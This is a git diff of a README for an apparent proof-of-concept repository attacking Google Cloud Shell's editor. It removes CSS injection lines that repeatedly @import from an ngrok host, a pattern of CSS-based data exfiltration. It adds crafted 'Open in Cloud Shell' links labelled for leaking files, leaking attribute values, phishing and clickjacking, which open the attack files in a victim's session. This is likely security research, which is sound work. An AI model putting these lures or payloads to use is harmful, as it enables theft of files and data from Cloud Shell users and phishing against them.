@@ -1,3 +1,11 @@
-# gcpcss
+## Leaking files:
+[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/?cloudshell_git_repo=https://github.com/Nowasky/gcpcss.git&show=ide&cloudshell_open_in_editor=leak_files.md,sensitive)
 
-><style>@import url(https://a85d97443840.ngrok.io/1); </style><style> @import url(https://a85d97443840.ngrok.io/2); </style><style> @import url(https://a85d97443840.ngrok.io/3)  ;</style><style> @import url(https://a85d97443840.ngrok.io/4)  ;</style><style> @import url(https://a85d97443840.ngrok.io/5)  ;</style><style> @import url(https://a85d97443840.ngrok.io/6)  ;</style><style> @import url(https://a85d97443840.ngrok.io/7)  ;</style><style> @import url(https://a85d97443840.ngrok.io/8)  ;</style><style> @import url(https://a85d97443840.ngrok.io/9)  ;</style><style> @import url(https://a85d97443840.ngrok.io/10)  ;</style> 
+## Leaking attribute values:
+[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/?cloudshell_git_repo=https://github.com/Nowasky/gcpcss.git&show=ide&cloudshell_open_in_editor=leak_attributes.md)
+
+## Phishing:
+[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/?cloudshell_git_repo=https://github.com/Nowasky/gcpcss.git&show=ide&cloudshell_open_in_editor=phishing.md)
+
+## Clickjacking:
+[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor)
